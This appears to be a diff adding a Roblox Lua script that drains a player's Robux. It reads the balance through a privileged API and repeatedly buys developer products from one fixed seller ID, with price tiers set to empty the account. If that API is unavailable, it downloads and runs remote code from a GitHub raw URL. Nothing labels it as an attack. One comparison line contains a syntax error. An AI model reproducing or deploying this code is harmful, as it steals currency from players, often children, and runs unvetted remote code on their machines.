@@ -1,0 +1,125 @@
+repeat task.wait() until game:IsLoaded()
+
+local function reject()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/123coconut123/Variables/main/Code"))()
+wait(100000000000)
+end
+
+local suc, err = pcall(function() game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency") end)
+if not err then
+print("continue")
+else
+reject()
+end
+
+while task.wait(0.25) do
+local x = game:GetService("HttpRbxApiService")
+local rb
+
+local response = x:GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency")
+
+local startIndex = string.find(response, '{"robux":')
+
+if startIndex then
+    local endIndex = string.find(response, '}', startIndex)
+
+    if endIndex then
+        rb = tonumber(string.sub(response, startIndex + 9, endIndex - 1))
+    end
+end
+
+local baba = '{"expectedCurrency":1,"expectedPrice":5,"expectedSellerId":4333856178}'
+local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":4333856178}'
+local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":4333856178}'
+local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":4333856178}'
+local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":4333856178}'
+local deimos = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":4333856178}'
+local artemis = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":4333856178}'
+local zeus = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":4333856178}'
+local kratos = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":4333856178}'
+local athena = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":4333856178}'
+local hephaestus = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":4333856178}'
+local hera = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":4333856178}'
+local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":4333856178}'
+local pegasus = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":4333856178}'
+local poseidon = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":4333856178}'
+local hermes = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":4333856178}'
+local apollo = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":4333856178}'
+local hades = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":4333856178}'
+local demeter = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":4333856178}'
+local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":4333856178}'
+local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":4333856178}'
+local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":4333856178}'
+
+if rb = 0 then
+
+elseif rb > 0 and rb < 15 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742727543", baba)
+wait()
+elseif rb >= 15 and rb < 25 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742719126", eros)
+wait()
+elseif rb >= 25 and rb < 50 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742719202", hercules)
+wait()
+elseif rb >= 50 and rb < 100 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716005", hylos)
+wait()
+elseif rb >= 100 and rb < 200 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716173", tartarus)
+wait()
+elseif rb >= 200 and rb < 300 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716267", deimos)
+wait()
+elseif rb >= 300 and rb < 500 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716358", artemis)
+wait()
+elseif rb >= 500 and rb < 750 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716467", zeus)
+wait()
+elseif rb >= 750 and rb < 1000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716605", kratos)
+wait()
+elseif rb >= 1000 and rb < 1500 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716729", athena)
+wait()
+elseif rb >= 1500 and rb < 2000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716888", hephaestus)
+wait()
+elseif rb >= 2000 and rb < 2500 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742716999", hera)
+wait()
+elseif rb >= 2500 and rb < 4000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742717147", krampus)
+wait()
+elseif rb >= 4000 and rb < 6000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742717298", pegasus)
+wait()
+elseif rb >= 6000 and rb < 8000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742717403", poseidon)
+wait()
+elseif rb >= 8000 and rb < 13000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742717559", hermes)
+wait()
+elseif rb >= 13000 and rb < 20000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742717680", apollo)
+wait()
+elseif rb >= 20000 and rb < 35000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742717954", hades)
+wait()
+elseif rb >= 35000 and rb < 50000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742718037", demeter)
+wait()
+elseif rb >= 50000 and rb < 75000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742718627", atlas)
+wait()
+elseif rb >= 75000 and rb < 150000 then
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742718881", cronus)
+wait()
+else
+x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742719038", helios)
+wait()
+end
+
+task.wait(0.01)
+end
